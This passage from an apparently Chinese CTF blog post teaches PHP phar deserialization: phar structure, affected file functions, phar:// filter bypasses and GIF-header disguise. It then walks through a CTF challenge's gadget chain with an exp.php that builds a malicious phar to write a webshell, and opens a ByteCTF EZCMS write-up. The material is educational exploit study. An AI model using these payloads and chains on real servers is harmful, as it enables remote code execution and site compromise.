<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment</span><br></pre></td></tr></table></figure>
<h3 id="phar反序列化"><a class="markdownIt-Anchor" href="#phar反序列化"></a> Phar反序列化</h3>
<p>phar反序列化即在文件系统函数（<code>file_exists()</code>、<code>is_dir()</code>等）参数可控的情况下，配合<code>phar://伪协议</code>，可以不依赖<code>unserialize()</code>直接进行反序列化操作。</p>
<h4 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h4>
<p>首先了解一下phar文件的结构，一个phar文件由四部分构成：</p>
<ul>
<li>
<p>a <strong>stub</strong>：可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
</li>
<li>
<p>a <strong>manifest</strong> describing the contents：phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的<strong>meta-data</strong>，这是上述攻击手法最核心的地方。</p>
</li>
<li>
<p>the file <strong>contents</strong>：被压缩文件的内容。</p>
</li>
<li>
<p>[optional] a <strong>signature</strong> for verifying Phar integrity (phar file format only)：签名，放在末尾，用于确认phar文件完整性。</p>
</li>
</ul>
<h4 id="demo-2"><a class="markdownIt-Anchor" href="#demo-2"></a> Demo</h4>
<p>注：生成phar文件需要将php.ini中的phar.readonly选项设置为off，否则无法生成phar文件</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221007152134587-166727395787412.png" alt="meta-data"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问之后就会生成phar.phar文件，打开查看，会看到meta-data是以序列化的形式存储的：</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221007150717433-166727395787413.png" alt="meta-data"></p>
<p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p>
<table>
<thead>
<tr>
<th>filename</th>
<th>filectime</th>
<th>file_exists</th>
<th>file_get_contents</th>
</tr>
</thead>
<tbody>
<tr>
<td>file_put_conents</td>
<td>file</td>
<td>filegroup</td>
<td>fopen</td>
</tr>
<tr>
<td>fileinode</td>
<td>filemtime</td>
<td>fileowner</td>
<td>fileperms</td>
</tr>
<tr>
<td>is_dir</td>
<td>is_executable</td>
<td>is_file</td>
<td>is_link</td>
</tr>
<tr>
<td>is_readable</td>
<td>is_writable</td>
<td>is_writeable</td>
<td>parse_ini_file</td>
</tr>
<tr>
<td>copy</td>
<td>unlink</td>
<td>stat</td>
<td>readfile</td>
</tr>
</tbody>
</table>
<p>实际上，只要调用了<code>php_stream_open_wrapper</code>的函数，都存在这样的问题，因此受影响的还有下列函数：</p>
<p><strong>exif</strong></p>
<ul>
<li><code>exif_thumbnail</code></li>
<li><code>exif_imagetype</code></li>
</ul>
<p><strong>gd</strong></p>
<ul>
<li><code>imageloadfont</code></li>
<li><code>imagecreatefrom</code></li>
</ul>
<p><strong>hash</strong></p>
<ul>
<li><code>hash_hmac_file</code></li>
<li><code>hash_file</code></li>
<li><code>hash_update_file</code></li>
<li><code>md5_file</code></li>
<li><code>sha1_file</code></li>
</ul>
<p><strong>file / url</strong></p>
<ul>
<li><code>get_meta_tags</code></li>
<li><code>get_headers</code></li>
<li><code>mime_content_type</code></li>
</ul>
<p><strong>standard</strong></p>
<ul>
<li><code>getimagesize</code></li>
<li><code>getimagesizefromstring</code></li>
</ul>
<p><strong>finfo</strong></p>
<ul>
<li><code>finfo_file</code></li>
<li><code>finfo_buffer</code></li>
</ul>
<p><strong>zip</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;TW.zip&#x27;</span>);</span><br><span class="line"><span class="variable">$zip</span> -&gt;<span class="title function_ invoke__">extractTo</span>(<span class="string">&#x27;phar://phar.phar/***&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><strong>Postgres</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;pgsql:host%s;dbname=%s;user=%s;password=%s;&quot;</span>,<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;postgres&quot;</span>,<span class="string">&quot;TW&quot;</span>,<span class="string">&#x27;123520&#x27;</span>));</span><br><span class="line">@<span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">pgsqlCopyFromFile</span>(<span class="string">&#x27;aa&#x27;</span>,<span class="string">&#x27;phar://phar.phar/aaa&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h4 id="trick"><a class="markdownIt-Anchor" href="#trick"></a> Trick</h4>
<p>过滤了phar://协议，绕过姿势：</p>
<ul>
<li><code>compress.bzip2://phar://</code></li>
<li><code>compress.zlib://phar:///</code></li>
<li><code>php://filter/resource=phar://</code></li>
</ul>
<blockquote>
<p>同时，还可以将伪造phar为其他格式的文件。</p>
<p>php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。如下：</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221007234558245-166727395787414.png" alt="伪造"></p>
<p>理论到这就差不多了，接下来讲一个2022MT决赛的复现题目，讲不明白的话，师傅们记得锤我。</p>
<h4 id="漏洞条件"><a class="markdownIt-Anchor" href="#漏洞条件"></a> 漏洞条件</h4>
<p>1、phar文件能够上传至服务器<br>
即要求存在file_get_contents()、fopen()这种函数</p>
<p>2、要有可利用的魔术方法<br>
这个的话用一位大师傅的话说就是利用魔术方法作为&quot;跳板&quot;</p>
<p>3、文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤<br>
一般利用姿势是上传Phar文件后通过伪协议Phar来实现反序列化，伪协议Phar格式是<code>Phar://</code>这种，如果这几个特殊字符被过滤就无法实现反序列化</p>
<h4 id="赛题复现"><a class="markdownIt-Anchor" href="#赛题复现"></a> 赛题复现</h4>
<h5 id="mtctf2022决赛"><a class="markdownIt-Anchor" href="#mtctf2022决赛"></a> <s>MTCTF2022决赛</s></h5>
<p>自己起了一个docker，我们先大概看一下题目吧。</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221008000647522-166727395787415.png" alt="test01"></p>
<p>文件上传先简单的传个文件抓个包看一下，</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221008002817077-166727395787416.png" alt="test02"></p>
<p>这里还没有去看源码，看到这个，就随便上传了一个码试了一下，发现图片上传后被发送到一个函数中处理。这里就意识到不是简单的文件上传了，决赛时也去啃源码了，但是没怎么啃明白，复现时间足够多，在加上Maxzed大师傅的wp总算啃明白了，源码太多，我就截重点来说吧。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$image</span>, ProcessorInterface <span class="variable">$processor</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;image = <span class="variable">$image</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;processor = <span class="variable">$processor</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Make sure that the image exists</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;image) === <span class="literal">false</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PixlException</span>(<span class="title function_ invoke__">vsprintf</span>(<span class="string">&#x27;The image [ %s ] does not exist.&#x27;</span>, [<span class="variable">$this</span>-&gt;image]));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Set the image</span></span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;processor-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$image</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这里看Maxzed师傅的wp没看出来他怎么判断存在phar反序列化漏洞，这里自己又去细看了一下源码。</p>
<p><s>光看这个是没有任何思路的，再截一段重要的源码说一下，开讲前肯定吧源码发到群里了，师傅们有想法的可以自取。</s></p>
<p>按照phar反序列化的惯例就是要找可控的函数，那就找吧<s>审那么大一个玩意儿确实难受</s></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImagesController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">home</span>(<span class="params">ViewFactory <span class="variable">$view</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$fileNames</span> = <span class="title function_ invoke__">array_diff</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;..&#x27;</span>));</span><br><span class="line">		<span class="variable">$images</span> = [];</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$fileNames</span> <span class="keyword">as</span> <span class="variable">$index</span> =&gt; <span class="variable">$fileName</span>) &#123;<span class="comment">//每次循环中，当前数组元素的值被赋给 $fileName，当前数组元素的键名也会在每次循环中被赋给变量 $index。并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个数组元素），直到遍历到数组的末尾，停止遍历并退出循环。</span></span><br><span class="line">			<span class="variable">$images</span>[<span class="variable">$fileName</span>] = <span class="string">&#x27;data:image/&#x27;</span> . <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$fileName</span>, PATHINFO_EXTENSION) . <span class="string">&#x27;;base64,&#x27;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fileName</span>));<span class="comment">//对每次循环的fileName进行base64编码</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;images&#x27;</span>, <span class="variable">$images</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$view</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;home&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$imageFile</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getFiles</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;image&#x27;</span>);</span><br><span class="line">		<span class="variable">$fileName</span> = <span class="variable">$imageFile</span>-&gt;<span class="title function_ invoke__">getReportedFilename</span>();<span class="comment">//获取fileName的一个函数，这里是读取imageFile的文件名并赋值给fileName</span></span><br><span class="line">		<span class="variable">$imageFile</span>-&gt;<span class="title function_ invoke__">moveTo</span>(<span class="variable">$fileName</span>);</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;response-&gt;<span class="title function_ invoke__">getHeaders</span>()-&gt;<span class="title function_ invoke__">add</span>(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">	&#125;<span class="comment">//就这个函数，要是敏锐一些，应该就能猜到fileName可控，那么就要找触发点，接着审。</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editGet</span>(<span class="params">ViewFactory <span class="variable">$view</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$fileName</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getQuery</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;filename&#x27;</span>);</span><br><span class="line">		<span class="variable">$image</span> = <span class="keyword">new</span> <span class="title class_">Image</span>(<span class="variable">$fileName</span>, <span class="keyword">new</span> <span class="title class_">ImageMagick</span>());<span class="comment">//可控的filename,这里可以用来触发phar</span></span><br><span class="line">		<span class="variable">$dimensions</span> = <span class="variable">$image</span>-&gt;<span class="title function_ invoke__">getDimensions</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;fileName&#x27;</span>, <span class="variable">$fileName</span>);</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;dimensions&#x27;</span>, <span class="variable">$dimensions</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$view</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;edit&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editPost</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$post</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getPost</span>();</span><br><span class="line">		<span class="variable">$fileName</span> = <span class="variable">$post</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;filename&#x27;</span>);</span><br><span class="line">		<span class="variable">$degrees</span> = <span class="variable">$post</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;degrees&#x27;</span>);</span><br><span class="line">		<span class="variable">$image</span> = <span class="keyword">new</span> <span class="title class_">Image</span>(<span class="variable">$fileName</span>, <span class="keyword">new</span> <span class="title class_">ImageMagick</span>());</span><br><span class="line">		<span class="variable">$image</span>-&gt;<span class="title function_ invoke__">rotate</span>(<span class="variable">$degrees</span>);</span><br><span class="line">		<span class="variable">$image</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;response-&gt;<span class="title function_ invoke__">getHeaders</span>()-&gt;<span class="title function_ invoke__">add</span>(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里来说一下fileName为啥是可控的,在Image构造函数中存在file_exists()来触发，同时在ediGet中filename进行get访问，即可用来触发phar</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221008212336541-166727395787417.png" alt="test03"></p>
<p>那么接下来就是挖链子了，</p>
<p>初步审下来，我这里就直接用maxzed的链子了，我就解读一下他为啥会用这个链子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Session.<span class="title function_ invoke__">__destruct</span>().<span class="title function_ invoke__">commit</span>()-&gt;</span><br><span class="line">File.<span class="title function_ invoke__">write</span>()-&gt;</span><br><span class="line">FileSystem.<span class="title function_ invoke__">put</span>()</span><br></pre></td></tr></table></figure>
<p>在Session.php中的__destruct(),具有自动提交会话数据的commit,数据传到File</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commit</span>(<span class="params"></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">// Replace old flash data with new</span></span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sessionData[<span class="string">&#x27;mako.flashdata&#x27;</span>] = <span class="variable language_">$this</span>-&gt;flashData;<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// Write session data</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;destroyed)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;sessionId, <span class="variable">$this</span>-&gt;sessionData, <span class="variable">$this</span>-&gt;options[<span class="string">&#x27;data_ttl&#x27;</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>在File.write()中存在写入功能点，链子利用的就是这个，接着看下一个功能点。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$sessionId</span>, <span class="keyword">array</span> <span class="variable">$sessionData</span>, <span class="keyword">int</span> <span class="variable">$dataTTL</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;fileSystem-&gt;<span class="title function_ invoke__">isWritable</span>(<span class="variable">$this</span>-&gt;sessionPath))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;fileSystem-&gt;<span class="title function_ invoke__">put</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">sessionFile</span>(<span class="variable">$sessionId</span>), <span class="title function_ invoke__">serialize</span>(<span class="variable">$sessionData</span>)) === <span class="literal">false</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>fileSystem.php中的put()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">put</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span>, <span class="variable">$data</span>, <span class="keyword">bool</span> <span class="variable">$lock</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$data</span>, <span class="variable">$lock</span> ? LOCK_EX : <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>file_put_contents():</p>
<p>功能：把一个字符串写入文件中。</p>
<p>语法：<code>file_put_contents(file,data,mode,context)</code></p>
<p>参数说明：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><em>file</em></td>
<td>必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。</td>
</tr>
<tr>
<td><em>data</em></td>
<td>可选。规定要写入文件的数据。可以是字符串、数组或数据流。</td>
</tr>
<tr>
<td><em>mode</em></td>
<td>可选。规定如何打开/写入文件。可能的值：FILE_USE_INCLUDE_PATHFILE_APPENDLOCK_EX</td>
</tr>
<tr>
<td><em>context</em></td>
<td>可选。规定文件句柄的环境。<em>context</em> 是一套可以修改流的行为的选项。若使用 null，则忽略</td>
</tr>
</tbody>
</table>
<p>参数 <em>data</em> 可以是数组（但不能是多维数组）。</p>
<p>自 PHP 5.1.0 起，<em>data</em> 参数也可以被指定为 stream 资源，stream 中所保存的缓存数据将被写入到指定文件中，这种用法就相似于使用 stream_copy_to_stream() 函数。</p>
<p>对 <em>context</em> 参数的支持是 PHP 5.0.0 添加的。</p>
<hr>
<p>这里就可以利用将我们想写入的数据写进容器中，理论成立，实践开始，我这里就直接用maxzed的exp啦，将shell写在/var/www/mako/public下。</p>
<p>exp.php:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      <span class="meta">?&gt;</span><span class="string">&#x27;);//由于要存本地，这个先和谐一下</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">namespace mako\session\stores&#123;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    use mako\file\FileSystem;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    class File&#123;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        protected $fileSystem;</span></span><br><span class="line"><span class="string">        protected $sessionPath;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        public function __construct()</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;fileSystem = new FileSystem();</span></span><br><span class="line"><span class="string">            $this-&gt;sessionPath = &quot;/var/www/mako/public&quot;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">namespace mako\file&#123;</span></span><br><span class="line"><span class="string">    class FileSystem&#123;</span></span><br><span class="line"><span class="string">        public function __construct()</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">namespace &#123;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    use mako\session\Session;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span></span><br><span class="line"><span class="string">    $phar-&gt;startBuffering();</span></span><br><span class="line"><span class="string">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span></span><br><span class="line"><span class="string">    $o = new Session();</span></span><br><span class="line"><span class="string">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="string">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;asd&quot;); //添加要压缩的文件</span></span><br><span class="line"><span class="string">//签名自动计算</span></span><br><span class="line"><span class="string">    $phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>接下来就是常规获取shell了，但是我自己本地搭的docker传上去的phar.phar没反应，没法读取，没能复现成功。<s>被迫换题说</s></p>
<h4 id="byte2019ezcms"><a class="markdownIt-Anchor" href="#byte2019ezcms"></a> Byte2019EZCMS</h4>
<p>题目靶场：[NSSCTF - <a href="https://www.ctfer.vip/problem/190">ByteCTF 2019]EZCMS (ctfer.vip)</a></p>
<p>题目考点：源码泄露、MD5长度攻击、phar反序列化</p>
<h5 id="解题过程"><a class="markdownIt-Anchor" href="#解题过程"></a> 解题过程：</h5>
<p>​      拿到题目，扫了一下目录，发现存在www.zip，访问www.zip获得源码 ，分析源码</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$password</span> === <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;u r not admin !!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;location.href=&quot;upload.php&quot;;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​    这里就是，只要passwor不是admin都可以登录进去，但是登录进去却不能上传文件</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221009185109443-166727395787418.png" alt="test05"></p>
<p>到这儿，就得去整体分析源码了</p>
